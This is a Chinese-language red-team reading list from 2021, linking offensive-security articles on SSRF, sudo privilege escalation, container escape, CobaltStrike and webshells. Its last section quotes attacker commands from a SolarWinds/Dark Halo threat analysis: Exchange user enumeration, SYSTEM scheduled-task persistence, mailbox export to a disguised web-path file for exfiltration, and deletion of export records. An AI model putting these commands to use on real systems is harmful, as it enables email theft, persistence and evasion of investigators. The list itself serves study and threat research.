# 2021-Read-article

有兴趣可以看看我的云渗透课程：https://www.yuque.com/u8047536/supvqp/ri4ft0

## 渗透

https://github.com/ihebski/DefaultCreds-cheat-sheet
> 网络设备默认密码

- [JumpServer 从信息泄露到远程代码执行漏洞分析](https://blog.riskivy.com/jumpserver-%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%88%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/)
> 标题描述有问题，泄漏机器user_id等，通过websocket获取token，再利用token通过相关的API来执行机器中的命令；

- [A Glossary of Blind SSRF Chains](https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/)
> 关于Blind SSRF利用

- [CVE-2021-3156](https://github.com/blasty/CVE-2021-3156)
> SUDO提权：
> make && ./sudo-hax-me-a-sandwich

https://github.com/Kyuu-Ji/Awesome-Azure-Pentest
> Azure渗透测试资料

https://afinepl.medium.com/testing-and-exploiting-java-deserialization-in-2021-e762f3e43ca2
> Java反序列化

- [offensive-security-guide-to-ssh-tunnels-and-proxies](https://posts.specterops.io/offensive-security-guide-to-ssh-tunnels-and-proxies-b525cbd4d4c6)

- [红蓝对抗中的云原生漏洞挖掘及利用实录](https://mp.weixin.qq.com/s/Aq8RrH34PTkmF8lKzdY38g)
> 2020年演练通过云原生突破进入内网；

> 容器环境收集收集技巧，Docker逃逸一些技巧和漏洞利用

> 编排组件API配置不当等：kubelet、etcd、dashboard


- [负载均衡下的 WebShell 连接](https://mp.weixin.qq.com/s/4Bmz_fuu0yrLMK1oBKKtRA)
> 通过代理脚本判断之后执行命令

- [CobaltStrike插件编写指南](https://mp.weixin.qq.com/s/i7QzwMAmUyxoBs0CwcGC-g)

- [渗透大型菠菜网站鸭脖](https://mp.weixin.qq.com/s/sJAyhQQvGqG-SliSGbhJNA)

- [HackTricks](https://book.hacktricks.xyz/)

- [web安全-数据验证不当](https://www.yuque.com/pmiaowu/web_security_1)

- [Atomic Red Team adds tests for cloud and containers](https://redcanary.com/blog/art-cloud-containers/)
> Atomic Red Team一直专注于传统的Windows端口，其实大部分云基础设施都是在Linux上运行

- [红队硬件工具包](https://github.com/sectool/redteam-hardware-toolkit)

- [安全建设-攻防思路及实践（一）](https://paper.seebug.org/1637/)

- [Exchange攻击方法](https://blog.orange.tw/2021/08/proxylogon-a-new-attack-surface-on-ms-exchange-part-1.html?m=1)

- [RedTeam笔记](https://kwcsec.gitbook.io/the-red-team-handbook/)

- [Zabbix攻击面](http://noahblog.360.cn/zabbixgong-ji-mian-wa-jue-yu-li-yong/)

- [COBALTSTIRKE BOF技术剖析（一）](http://blog.nsfocus.net/cobaltstirke-bof/)
> 内存中不落地执行，避免针对文件内容的检测，在本进程加载执行BOF中的功能代码。

- [MYSQL存在注入点，写WEBSHELL的5种方式](https://manning23.github.io/2019/07/23/MYSQL%E5%AD%98%E5%9C%A8%E6%B3%A8%E5%85%A5%E7%82%B9%EF%BC%8C%E5%86%99WebShell%E7%9A%845%E7%A7%8D%E6%96%B9%E5%BC%8F/)

- [红蓝对抗之隐蔽通信应用及防御](https://mp.weixin.qq.com/s/huDegnt6oMg-drOB0SyZfg)

- [Compromising vCenter via SAML Certificates](https://www.horizon3.ai/compromising-vcenter-via-saml-certificates/)
> 通过读取data.mdb中的证书，通过证书请求获取管理员cookie

- [Public Pentest reports](https://pentestreports.com/reports/)
> 国外公开渗透测试报告模板

- [Serverless 扫描技术研究及应用](https://paper.seebug.org/1776/)

- [CVE-2021-42287/CVE-2021-42278 漏洞复现](https://www.yuque.com/0xcccccccc/vul/wean9o?)


## 内网渗透

- [dark-halo-leverages-solarwinds-compromise-to-breach-organizations](https://www.volexity.com/blog/2020/12/14/dark-halo-leverages-solarwinds-compromise-to-breach-organizations/)
```bash
使用Get-ManagementRoleAssignment获取用户列表
C:\Windows\system32\cmd.exe /C powershell.exe -PSConsoleFile exshell.psc1 -Command "Get-ManagementRoleAssignment -GetEffectiveUsers | select Name,Role,EffectiveUserName,AssignmentMethod,IsValid | ConvertTo-Csv -NoTypeInformation | % {$_ -replace ‘`n’,’_’} | Out-File C:\temp\1.xml"
 
获取虚拟目录配置信息
C:\Windows\system32\cmd.exe /C powershell.exe -PSConsoleFile exshell.psc1 -Command "Get-WebServicesVirtualDirectory | Format-List"
 
查询组织管理成员，sqlceip.exe其实是ADFind.exe
C:\Windows\system32\cmd.exe /C sqlceip.exe -default -f (name="Organization Management") member -list | sqlceip.exe -f objectcategory=* > .\SettingSync\log2.txt
 
创建计划任务
$scheduler = New-Object -ComObject ("Schedule.Service");$scheduler.Connect($env:COMPUTERNAME);$folder = $scheduler.GetFolder("\Microsoft\Windows\SoftwareProtectionPlatform");$task = $folder.GetTask(“EventCacheManager”);$definition = $task.Definition;$definition.Settings.ExecutionTimeLimit = “PT0S”;$folder.RegisterTaskDefinition($task.Name,$definition,6,”System”,$null,5);echo “Done”
 
C:\Windows\system32\cmd.exe /C schtasks /create /F /tn “\Microsoft\Windows\SoftwareProtectionPlatform\EventCacheManager” /tr “C:\Windows\SoftwareDistribution\EventCacheManager.exe” /sc ONSTART /ru system /S [machine_name] 
 
密取数据：
使用New-MailboxExportRequest 和 Get-MailboxExport-Request 命令从邮箱中窃取数据
C:\Windows\system32\cmd.exe /C powershell.exe -PSConsoleFile exshell.psc1 -Command “New-MailboxExportRequest -Mailbox foobar@organization.here -ContentFilter {(Received -ge ’03/01/2020′)} -FilePath ‘\\<MAILSERVER>\c$\temp\b.pst'”
 
7z打包加密
C:\Windows\system32\cmd.exe /C .\7z.exe a -mx9 -r0 -p[33_char_password]  “C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\Redir.png” C:\Temp\b.pst
 
https://owa.organization.here/owa/auth/Redir.png
\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\
 
同步邮件
C:\Windows\system32\cmd.exe /C powershell.exe -PSConsoleFile exshell.psc1 -Command “Set-CASMailbox -Identity <UserID> -ActiveSyncAllowedDeviceIDs @{add=’XXXXXXXXXXXXX’}"
 
清除记录：
C:\Windows\system32\cmd.exe /C powershell.exe -PSConsoleFile exshell.psc1 -Command "Get-MailboxExportRequest -Mailbox user@organization.here | Remove-MailboxExportRequest -Confirm:$False"
```






